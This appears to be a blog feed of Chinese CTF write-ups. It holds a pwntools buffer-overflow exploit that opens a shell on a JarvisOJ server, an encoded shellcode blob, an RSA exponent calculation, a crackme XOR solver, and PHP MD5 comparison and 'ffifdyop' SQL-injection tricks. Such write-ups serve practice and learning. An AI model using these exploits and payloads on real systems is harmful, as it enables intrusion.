      <title>CTF-JarvisOJ-Pwn-[XMAN]level0</title>
      <link href="/2018/11/30/CTF-JarvisOJ-Pwn-%5BXMAN%5Dlevel0/"/>
      <url>/2018/11/30/CTF-JarvisOJ-Pwn-%5BXMAN%5Dlevel0/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="nc-pwn2-jarvisoj-com-9881"><a href="#nc-pwn2-jarvisoj-com-9881" class="headerlink" title="nc pwn2.jarvisoj.com 9881"></a>nc pwn2.jarvisoj.com 9881</h3><p>文件下载<a href="level0.b9ded3801d6dd36a97468e128b81a65d">level0.b9ded3801d6dd36a97468e128b81a65d</a></p><h2 id="将文件导入ida64，在vulnerable-function-函数中发现read函数，且存在漏洞"><a href="#将文件导入ida64，在vulnerable-function-函数中发现read函数，且存在漏洞" class="headerlink" title="将文件导入ida64，在vulnerable_function()函数中发现read函数，且存在漏洞"></a>将文件导入ida64，在vulnerable_function()函数中发现read函数，且存在漏洞</h2><p><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/1.png" class="lazyload"></a><br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/2.png" class="lazyload"></a></p><p>另外发现 callsystem函数，所以我们只需要read的时候将返回函数替换为callsystem函数的地址便可以拿到shell<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/3.png" class="lazyload"></a></p><p>callsystem函数地址为<a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/5.png" class="lazyload"></a></p><p>接着我们进入Ubuntu，然后输入 nc pwn2.jarvisoj.com 9881<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/4.png" class="lazyload"></a></p><h1 id="远程主机可以运行这个程序"><a href="#远程主机可以运行这个程序" class="headerlink" title="远程主机可以运行这个程序"></a>远程主机可以运行这个程序</h1><p>接下来我们开始用python的pwntools来编写exp</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">junk = "a" * 0x88</span><br><span class="line">address = 0x0000000000400596</span><br><span class="line">payload = junk + p64(address)</span><br><span class="line">sh = remote("pwn2.jarvisoj.com",9881)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><p>然后运行python程序<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/6.png" class="lazyload"></a></p><p>我们通过ls指令来枚举当前目录下所有的文件<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/7.png" class="lazyload"></a></p><p>发现flag文件<br>然后我们使用cat指令来获取文本<br><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/8.png" class="lazyload"></a></p><h3 id="CTF-713ca3944e92180e0ef03171981dcd41"><a href="#CTF-713ca3944e92180e0ef03171981dcd41" class="headerlink" title="CTF{713ca3944e92180e0ef03171981dcd41}"></a>CTF{713ca3944e92180e0ef03171981dcd41}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-Shellcode</title>
      <link href="/2018/11/27/CTF-JarvisOJ-Basic-Shellcode/"/>
      <url>/2018/11/27/CTF-JarvisOJ-Basic-Shellcode/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="作为一个黑客，怎么能不会使用shellcode"><a href="#作为一个黑客，怎么能不会使用shellcode" class="headerlink" title="作为一个黑客，怎么能不会使用shellcode?"></a>作为一个黑客，怎么能不会使用shellcode?</h2><h2 id="这里给你一段shellcode，你能正确使用并最后得到flag吗？"><a href="#这里给你一段shellcode，你能正确使用并最后得到flag吗？" class="headerlink" title="这里给你一段shellcode，你能正确使用并最后得到flag吗？"></a>这里给你一段shellcode，你能正确使用并最后得到flag吗？</h2><h2 id="PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYIhkmKzyCDq4l4FQyBlrRWEahI1tLKT16Pnk1ftLnkPvwlnkW6fhNkan5pNkgF6XPOR8T5HsCivaN19okQSPlKRLvD6DNk3uelNkpTthRXuQ9znk2jEHLK1Ja0FaXkhcTtBink4tlKUQhnvQYotqo0ylnLMTO0SDEWZahOtMwqhG8kXteksLwTdh1e8aLKsja4uQ8kavLKdLrklK0ZeL7qjKLKUTLKuQM8k9bdvDeL1qiSnR5XVIXTOyjENikrphNnrnVnhlBrzHooKOYoyok93u7tOKCNyHzBBSnguLgTcbyxlNKOYoYoMYaUTHphRL2LupQQ0htsFRTn541x3E2Se5T26PyKK8QLTddJlIZFBvyoSeUTLIkrv0oKy8ORpMmlk7Gl6DBrm8SoyoioyoaxrOqh0XwP1xu1Qw1upBbHrmrED3T34qiKOxQLTdEZOyZCaxQmRxgPUp0hpnPn4srRe8BDSo2PT7axqOCWROpophSYpnSo04u83K72Peu70hBpCsqDpF4qHIMXpLQ429k98aEaJr1BF3Ca3bIozp01IPf0Yof5GxAA"><a href="#PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYIhkmKzyCDq4l4FQyBlrRWEahI1tLKT16Pnk1ftLnkPvwlnkW6fhNkan5pNkgF6XPOR8T5HsCivaN19okQSPlKRLvD6DNk3uelNkpTthRXuQ9znk2jEHLK1Ja0FaXkhcTtBink4tlKUQhnvQYotqo0ylnLMTO0SDEWZahOtMwqhG8kXteksLwTdh1e8aLKsja4uQ8kavLKdLrklK0ZeL7qjKLKUTLKuQM8k9bdvDeL1qiSnR5XVIXTOyjENikrphNnrnVnhlBrzHooKOYoyok93u7tOKCNyHzBBSnguLgTcbyxlNKOYoYoMYaUTHphRL2LupQQ0htsFRTn541x3E2Se5T26PyKK8QLTddJlIZFBvyoSeUTLIkrv0oKy8ORpMmlk7Gl6DBrm8SoyoioyoaxrOqh0XwP1xu1Qw1upBbHrmrED3T34qiKOxQLTdEZOyZCaxQmRxgPUp0hpnPn4srRe8BDSo2PT7axqOCWROpophSYpnSo04u83K72Peu70hBpCsqDpF4qHIMXpLQ429k98aEaJr1BF3Ca3bIozp01IPf0Yof5GxAA" class="headerlink" title="PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYIhkmKzyCDq4l4FQyBlrRWEahI1tLKT16Pnk1ftLnkPvwlnkW6fhNkan5pNkgF6XPOR8T5HsCivaN19okQSPlKRLvD6DNk3uelNkpTthRXuQ9znk2jEHLK1Ja0FaXkhcTtBink4tlKUQhnvQYotqo0ylnLMTO0SDEWZahOtMwqhG8kXteksLwTdh1e8aLKsja4uQ8kavLKdLrklK0ZeL7qjKLKUTLKuQM8k9bdvDeL1qiSnR5XVIXTOyjENikrphNnrnVnhlBrzHooKOYoyok93u7tOKCNyHzBBSnguLgTcbyxlNKOYoYoMYaUTHphRL2LupQQ0htsFRTn541x3E2Se5T26PyKK8QLTddJlIZFBvyoSeUTLIkrv0oKy8ORpMmlk7Gl6DBrm8SoyoioyoaxrOqh0XwP1xu1Qw1upBbHrmrED3T34qiKOxQLTdEZOyZCaxQmRxgPUp0hpnPn4srRe8BDSo2PT7axqOCWROpophSYpnSo04u83K72Peu70hBpCsqDpF4qHIMXpLQ429k98aEaJr1BF3Ca3bIozp01IPf0Yof5GxAA"></a>PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYIhkmKzyCDq4l4FQyBlrRWEahI1tLKT16Pnk1ftLnkPvwlnkW6fhNkan5pNkgF6XPOR8T5HsCivaN19okQSPlKRLvD6DNk3uelNkpTthRXuQ9znk2jEHLK1Ja0FaXkhcTtBink4tlKUQhnvQYotqo0ylnLMTO0SDEWZahOtMwqhG8kXteksLwTdh1e8aLKsja4uQ8kavLKdLrklK0ZeL7qjKLKUTLKuQM8k9bdvDeL1qiSnR5XVIXTOyjENikrphNnrnVnhlBrzHooKOYoyok93u7tOKCNyHzBBSnguLgTcbyxlNKOYoYoMYaUTHphRL2LupQQ0htsFRTn541x3E2Se5T26PyKK8QLTddJlIZFBvyoSeUTLIkrv0oKy8ORpMmlk7Gl6DBrm8SoyoioyoaxrOqh0XwP1xu1Qw1upBbHrmrED3T34qiKOxQLTdEZOyZCaxQmRxgPUp0hpnPn4srRe8BDSo2PT7axqOCWROpophSYpnSo04u83K72Peu70hBpCsqDpF4qHIMXpLQ429k98aEaJr1BF3Ca3bIozp01IPf0Yof5GxAA</h2><h1 id="这里我们需要一个工具shellcodeexec-master"><a href="#这里我们需要一个工具shellcodeexec-master" class="headerlink" title="这里我们需要一个工具shellcodeexec-master"></a>这里我们需要一个工具<a href="shellcodeexec-master.rar">shellcodeexec-master</a></h1><h1 id="进入控制台，且控制进入我们的目录，然后输入代码"><a href="#进入控制台，且控制进入我们的目录，然后输入代码" class="headerlink" title="进入控制台，且控制进入我们的目录，然后输入代码"></a>进入控制台，且控制进入我们的目录，然后输入代码</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\shellcodeexec.x32.exe PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP</span><br><span class="line">8ABuJIYIhkmKzyCDq4l4FQyBlrRWEahI1tLKT16Pnk1ftLnkPvwlnkW6fhNkan5pNkgF6XPOR8T5HsCivaN19okQSPlKRLvD6DNk3uelNkpTthRXuQ9znk2j</span><br><span class="line">EHLK1Ja0FaXkhcTtBink4tlKUQhnvQYotqo0ylnLMTO0SDEWZahOtMwqhG8kXteksLwTdh1e8aLKsja4uQ8kavLKdLrklK0ZeL7qjKLKUTLKuQM8k9bdvDeL</span><br><span class="line">1qiSnR5XVIXTOyjENikrphNnrnVnhlBrzHooKOYoyok93u7tOKCNyHzBBSnguLgTcbyxlNKOYoYoMYaUTHphRL2LupQQ0htsFRTn541x3E2Se5T26PyKK8QL</span><br><span class="line">TddJlIZFBvyoSeUTLIkrv0oKy8ORpMmlk7Gl6DBrm8SoyoioyoaxrOqh0XwP1xu1Qw1upBbHrmrED3T34qiKOxQLTdEZOyZCaxQmRxgPUp0hpnPn4srRe8BD</span><br><span class="line">So2PT7axqOCWROpophSYpnSo04u83K72Peu70hBpCsqDpF4qHIMXpLQ429k98aEaJr1BF3Ca3bIozp01IPf0Yof5GxAA</span><br></pre></td></tr></tbody></table></figure></div><p>出现弹窗，弹窗内容为flag<br><a href="/2018/11/27/CTF-JarvisOJ-Basic-Shellcode/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/27/CTF-JarvisOJ-Basic-Shellcode/1.png" class="lazyload"></a></p><h3 id="PCTF-Begin-4-good-pwnn3r"><a href="#PCTF-Begin-4-good-pwnn3r" class="headerlink" title="PCTF{Begin_4_good_pwnn3r}"></a>PCTF{Begin_4_good_pwnn3r}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-veryeasyRSA</title>
      <link href="/2018/11/27/CTF-JarvisOJ-Basic-veryeasyRSA/"/>
      <url>/2018/11/27/CTF-JarvisOJ-Basic-veryeasyRSA/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="已知RSA公钥生成参数："><a href="#已知RSA公钥生成参数：" class="headerlink" title="已知RSA公钥生成参数："></a>已知RSA公钥生成参数：</h3><h3 id="p-3487583947589437589237958723892346254777"><a href="#p-3487583947589437589237958723892346254777" class="headerlink" title="p = 3487583947589437589237958723892346254777"></a>p = 3487583947589437589237958723892346254777</h3><h3 id="q-8767867843568934765983476584376578389"><a href="#q-8767867843568934765983476584376578389" class="headerlink" title="q = 8767867843568934765983476584376578389"></a>q = 8767867843568934765983476584376578389</h3><h3 id="e-65537"><a href="#e-65537" class="headerlink" title="e = 65537"></a>e = 65537</h3><h3 id="求d"><a href="#求d" class="headerlink" title="求d ="></a>求d =</h3><h3 id="请提交PCTF-d"><a href="#请提交PCTF-d" class="headerlink" title="请提交PCTF{d}"></a>请提交PCTF{d}</h3><h3 id="Hint1-有好多小伙伴问d提交什么格式的，现在明确一下，提交十进制的d"><a href="#Hint1-有好多小伙伴问d提交什么格式的，现在明确一下，提交十进制的d" class="headerlink" title="Hint1: 有好多小伙伴问d提交什么格式的，现在明确一下，提交十进制的d"></a>Hint1: 有好多小伙伴问d提交什么格式的，现在明确一下，提交十进制的d</h3><p>这道题考查我们的RSA公钥生成的方法，我们可以使用python</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import sys</span><br><span class="line">p = 3487583947589437589237958723892346254777</span><br><span class="line">q = 8767867843568934765983476584376578389</span><br><span class="line">e = 65537</span><br><span class="line">l = (p-1)*(q-1)</span><br><span class="line">q = RSA.inverse(e,l)</span><br><span class="line">print q</span><br></pre></td></tr></tbody></table></figure></div><h2 id="生成的公钥：19178568796155560423675975774142829153827883709027717723363077606260717434369"><a href="#生成的公钥：19178568796155560423675975774142829153827883709027717723363077606260717434369" class="headerlink" title="生成的公钥：19178568796155560423675975774142829153827883709027717723363077606260717434369"></a>生成的公钥：19178568796155560423675975774142829153827883709027717723363077606260717434369</h2><h3 id="PCTF-19178568796155560423675975774142829153827883709027717723363077606260717434369"><a href="#PCTF-19178568796155560423675975774142829153827883709027717723363077606260717434369" class="headerlink" title="PCTF{19178568796155560423675975774142829153827883709027717723363077606260717434369}"></a>PCTF{19178568796155560423675975774142829153827883709027717723363077606260717434369}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-Easy Crackme</title>
      <link href="/2018/11/27/CTF-JarvisOJ-Basic-Easy%20Crackme/"/>
      <url>/2018/11/27/CTF-JarvisOJ-Basic-Easy%20Crackme/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="Easy-Crackme"><a href="#Easy-Crackme" class="headerlink" title="Easy Crackme"></a>Easy Crackme</h3><h2 id="都说逆向挺难的，但是这题挺容易的，反正我不会，大家来挑战一下吧"><a href="#都说逆向挺难的，但是这题挺容易的，反正我不会，大家来挑战一下吧" class="headerlink" title="都说逆向挺难的，但是这题挺容易的，反正我不会，大家来挑战一下吧~~:)"></a>都说逆向挺难的，但是这题挺容易的，反正我不会，大家来挑战一下吧~~:)</h2><h1 id="文件下载easycrackme-6dbc7c78c9bb25f724cd55c0e1412617"><a href="#文件下载easycrackme-6dbc7c78c9bb25f724cd55c0e1412617" class="headerlink" title="文件下载easycrackme.6dbc7c78c9bb25f724cd55c0e1412617"></a>文件下载<a href="easycrackme.6dbc7c78c9bb25f724cd55c0e1412617">easycrackme.6dbc7c78c9bb25f724cd55c0e1412617</a></h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">{</span><br><span class="line">  __int64 v3; // rdi</span><br><span class="line">  char v5; // [rsp+0h] [rbp-38h]</span><br><span class="line">  char v6; // [rsp+1h] [rbp-37h]</span><br><span class="line">  char v7; // [rsp+2h] [rbp-36h]</span><br><span class="line">  char v8; // [rsp+3h] [rbp-35h]</span><br><span class="line">  char v9; // [rsp+4h] [rbp-34h]</span><br><span class="line">  char v10; // [rsp+5h] [rbp-33h]</span><br><span class="line">  unsigned __int8 v11; // [rsp+10h] [rbp-28h]</span><br><span class="line">  _BYTE v12[7]; // [rsp+11h] [rbp-27h]</span><br><span class="line"></span><br><span class="line">  v5 = -85;</span><br><span class="line">  v6 = -35;</span><br><span class="line">  v7 = 51;</span><br><span class="line">  v8 = 84;</span><br><span class="line">  v9 = 53;</span><br><span class="line">  v10 = -17;</span><br><span class="line">  printf((unsigned __int64)"Input your password:");</span><br><span class="line">  _isoc99_scanf((unsigned __int64)"%s");</span><br><span class="line">  if ( strlen((const char *)&v11) == 26 )</span><br><span class="line">  {</span><br><span class="line">    v3 = 0LL;</span><br><span class="line">    if ( (v11 ^ 0xAB) == list1 )</span><br><span class="line">    {</span><br><span class="line">      while ( (v12[v3] ^ (unsigned __int8)*(&v5 + ((signed int)v3 + 1) % 6)) == byte_6B41D1[v3] )</span><br><span class="line">      {</span><br><span class="line">        if ( ++v3 == 25 )</span><br><span class="line">        {</span><br><span class="line">          printf((unsigned __int64)"Congratulations!");</span><br><span class="line">          return 0;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  printf((unsigned __int64)"Password Wrong!! Please try again.");</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>代码的思路很简单，<br>第一位flag先异或0xAB，之后的flag在while循环中<br>就是把v5-v10作为密码表，然后异或假码，然后验证<br>byte_6B41D1 的值为 9E 67 12 4E 9D 98 AB 00 06 46 8A F4 B4 06 0B 43 DC D9 A4 6C 31 74 9C D2 A0<br>但是(unsigned __int8)*(&v5 + ((signed int)v3 + 1) % 6) 其实取出的数据是v5-v10的int8数据<br>所以我们需要对v5-v10的二进制取后八位<br>比如  -85 = 1111111111111111111111111111111111111111111111111111111110101011<br>然后取后面8位,即 10101011  所以v5 = 171<br>转化完之后，我们开始用python编写代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print 'first is '+chr(0xFB^0xAB)</span><br><span class="line">s = "\x9E\x67\x12\x4E\x9D\x98\xAB\x00\x06\x46\x8A\xF4\xB4\x06\x0B\x43\xDC\xD9\xA4\x6C\x31\x74\x9C\xD2\xA0"</span><br><span class="line">key_box = [171,221,51,84,53,239]</span><br><span class="line">for i in range(0,25):</span><br><span class="line">     print chr(key_box[(i+1) % 6]^ord(s[i]))</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2018/11/27/CTF-JarvisOJ-Basic-Easy%20Crackme/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/27/CTF-JarvisOJ-Basic-Easy%20Crackme/1.png" class="lazyload"></a></p><h3 id="PCTF-r3v3Rse-i5-v3ry-eAsy"><a href="#PCTF-r3v3Rse-i5-v3ry-eAsy" class="headerlink" title="PCTF{r3v3Rse_i5_v3ry_eAsy}"></a>PCTF{r3v3Rse_i5_v3ry_eAsy}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PHP-MD5常用漏洞</title>
      <link href="/2018/11/25/CTF-PHP-MD5%E5%B8%B8%E7%94%A8%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/11/25/CTF-PHP-MD5%E5%B8%B8%E7%94%A8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>var_dump(md5(‘240610708’) == md5(‘QNKCDZO’));<br>var_dump(md5(‘aabg7XSs’) == md5(‘aabC9RqS’));<br>var_dump(sha1(‘aaroZmOk’) == sha1(‘aaK1STfY’));<br>var_dump(sha1(‘aaO8zKZF’) == sha1(‘aa3OFF9m’));<br>var_dump(‘0010e2’ == ‘1e3’);<br>var_dump(‘0x1234Ab’ == ‘1193131’);<br>var_dump(‘0xABCdef’ == ‘ 0xABCdef’);</p><p>0e开头<br>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a</p><p>可构造’or’6<乱码><br>字符串：ffifdyop<br>md5<br>加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为字符串：’or’6<乱码></p><p>那么，拼接后的语句为：select * from admin where password=’’or’6<乱码>’ ，就相当于select * from admin where password=’’or 1 ,实现sql注入。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-成都大学网络攻防-Re3</title>
      <link href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/"/>
      <url>/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="蕾蕾姐终于接触到了另一个软件：那个女人！经过简单的分析之后，蕾蕾姐得出了答案，这件事情告诉我们，C语言要好好学哦。"><a href="#蕾蕾姐终于接触到了另一个软件：那个女人！经过简单的分析之后，蕾蕾姐得出了答案，这件事情告诉我们，C语言要好好学哦。" class="headerlink" title="蕾蕾姐终于接触到了另一个软件：那个女人！经过简单的分析之后，蕾蕾姐得出了答案，这件事情告诉我们，C语言要好好学哦。"></a>蕾蕾姐终于接触到了另一个软件：那个女人！经过简单的分析之后，蕾蕾姐得出了答案，这件事情告诉我们，C语言要好好学哦。</h2><h2 id="ps：flag-要自己加上去鸭！"><a href="#ps：flag-要自己加上去鸭！" class="headerlink" title="ps：flag{}要自己加上去鸭！"></a>ps：flag{}要自己加上去鸭！</h2><p>下载文件<a href="RE3.rar">RE3.rar</a></p><p>###这个软件很明显是 IDA<br>##将程序导入IDA<br><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/1.png" class="lazyload"></a></p><h1 id="然后反编译为c语言代码"><a href="#然后反编译为c语言代码" class="headerlink" title="然后反编译为c语言代码"></a>然后反编译为c语言代码</h1><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/2.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_401060((const char *)&v4)</span><br></pre></td></tr></tbody></table></figure></div><h1 id="这个函数很可疑，我们双击进入"><a href="#这个函数很可疑，我们双击进入" class="headerlink" title="这个函数很可疑，我们双击进入"></a>这个函数很可疑，我们双击进入</h1><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/3.png" class="lazyload"></a></p><h2 id="v5这个变量的赋值十分可疑，我们查看一下"><a href="#v5这个变量的赋值十分可疑，我们查看一下" class="headerlink" title="v5这个变量的赋值十分可疑，我们查看一下"></a>v5这个变量的赋值十分可疑，我们查看一下</h2><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/4.png" class="lazyload"></a></p><h1 id="然后我们回过头来，重新分析一下代码"><a href="#然后我们回过头来，重新分析一下代码" class="headerlink" title="然后我们回过头来，重新分析一下代码"></a>然后我们回过头来，重新分析一下代码</h1><h1 id="首先它将-key-xor-0x20-然后将真码的ascii减去5-然后再进行比较"><a href="#首先它将-key-xor-0x20-然后将真码的ascii减去5-然后再进行比较" class="headerlink" title="首先它将 key xor 0x20    然后将真码的ascii减去5  然后再进行比较"></a>首先它将 key xor 0x20    然后将真码的ascii减去5  然后再进行比较</h1><h1 id="我们把程序导入od，进行动态分析，随便输入一些key"><a href="#我们把程序导入od，进行动态分析，随便输入一些key" class="headerlink" title="我们把程序导入od，进行动态分析，随便输入一些key"></a>我们把程序导入od，进行动态分析，随便输入一些key</h1><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/5.png" class="lazyload"></a></p><h2 id="然后在-0040101F-的-Call-00401060-步入"><a href="#然后在-0040101F-的-Call-00401060-步入" class="headerlink" title="然后在 0040101F 的 Call 00401060 步入"></a>然后在 0040101F 的 Call 00401060 步入</h2><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title 